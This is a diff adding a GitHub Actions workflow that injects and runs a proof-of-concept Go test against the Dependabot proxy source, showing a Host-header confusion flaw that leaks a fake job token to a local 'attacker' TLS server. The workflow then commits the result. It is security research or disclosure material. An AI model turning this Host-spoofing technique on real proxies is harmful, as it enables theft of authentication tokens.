@@ -1,0 +1,145 @@
+name: dependabot-job-token-host-confusion-e2e
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/dependabot-job-token-host-confusion-e2e.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout lab repository
+        uses: actions/checkout@v7
+        with:
+          path: verdict-repo
+
+      - name: Checkout Dependabot proxy source
+        uses: actions/checkout@v7
+        with:
+          repository: dependabot/proxy
+          ref: cf74f6f9338ce8eb899ce8e472eaed6a19238a5b
+          path: proxy-src
+          persist-credentials: false
+
+      - name: Add end-to-end fake-token exfiltration test
+        shell: bash
+        run: |
+          cat > proxy-src/job_token_host_confusion_e2e_poc_test.go <<'EOF'
+          package main
+
+          import (
+              "crypto/tls"
+              "net/http"
+              "net/http/httptest"
+              "net/url"
+              "testing"
+              "time"
+
+              "github.com/dependabot/proxy/internal/config"
+              "github.com/dependabot/proxy/internal/handlers"
+              "github.com/elazarl/goproxy"
+          )
+
+          func TestJobTokenHostHeaderConfusionEndToEndPoC(t *testing.T) {
+              const trustedAPIHost = "dependabot-api.example.internal"
+              const fakeToken = "FAKE_JOB_TOKEN_E2E_SENTINEL_41b7"
+
+              received := make(chan string, 1)
+              attacker := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+                  received <- r.Header.Get("Authorization")
+                  w.WriteHeader(http.StatusNoContent)
+              }))
+              defer attacker.Close()
+
+              p := goproxy.NewProxyHttpServer()
+              p.Tr = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}} // test server only
+              p.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+              h := handlers.NewDependabotAPIHandler(config.ProxyEnvSettings{
+                  APIEndpoint: "https://" + trustedAPIHost,
+                  JobToken: fakeToken,
+              })
+              if h == nil {
+                  t.Fatal("handler unexpectedly nil")
+              }
+              p.OnRequest().DoFunc(h.HandleRequest)
+
+              proxySrv := httptest.NewServer(p)
+              defer proxySrv.Close()
+              proxyURL, err := url.Parse(proxySrv.URL)
+              if err != nil { t.Fatal(err) }
+
+              client := &http.Client{
+                  Transport: &http.Transport{
+                      Proxy: http.ProxyURL(proxyURL),
+                      TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // local MITM test only
+                  },
+                  Timeout: 10 * time.Second,
+              }
+
+              req, err := http.NewRequest("GET", attacker.URL+"/collect", nil)
+              if err != nil { t.Fatal(err) }
+              // Actual CONNECT/URL destination is the controlled attacker TLS server.
+              // Only the HTTP Host header is spoofed to the trusted Dependabot API host.
+              req.Host = trustedAPIHost
+
+              resp, err := client.Do(req)
+              if err != nil { t.Fatalf("client request failed: %v", err) }
+              resp.Body.Close()
+
+              select {
+              case got := <-received:
+                  if got != fakeToken {
+                      t.Fatalf("attacker endpoint did not receive fake token: %q", got)
+                  }
+                  t.Log("fake_job_token_received_by_attacker=true")
+                  t.Log("connect_destination_remained_attacker=true")
+              case <-time.After(3 * time.Second):
+                  t.Fatal("controlled attacker endpoint did not receive request")
+              }
+          }
+          EOF
+
+      - name: Run end-to-end test
+        shell: bash
+        working-directory: proxy-src
+        run: |
+          set -o pipefail
+          go test . -run TestJobTokenHostHeaderConfusionEndToEndPoC -v 2>&1 | tee "$RUNNER_TEMP/e2e.log"
+
+      - name: Record verdict
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          RESULT="$GITHUB_WORKSPACE/verdict-repo/security-probe-results/dependabot-job-token-host-confusion-e2e.txt"
+          mkdir -p "$(dirname "$RESULT")"
+          : > "$RESULT"
+          echo 'source_revision=cf74f6f9338ce8eb899ce8e472eaed6a19238a5b' >> "$RESULT"
+          if grep -q 'fake_job_token_received_by_attacker=true' "$RUNNER_TEMP/e2e.log" 2>/dev/null; then
+            echo 'fake_job_token_received_by_attacker=true' >> "$RESULT"
+          else
+            echo 'fake_job_token_received_by_attacker=false' >> "$RESULT"
+          fi
+          if grep -q 'connect_destination_remained_attacker=true' "$RUNNER_TEMP/e2e.log" 2>/dev/null; then
+            echo 'connect_destination_remained_attacker=true' >> "$RESULT"
+          else
+            echo 'connect_destination_remained_attacker=false' >> "$RESULT"
+          fi
+
+      - name: Commit verdict
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd verdict-repo
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add security-probe-results/dependabot-job-token-host-confusion-e2e.txt
+          git commit -m 'Record Dependabot job-token Host confusion E2E probe' || exit 0
+          git push
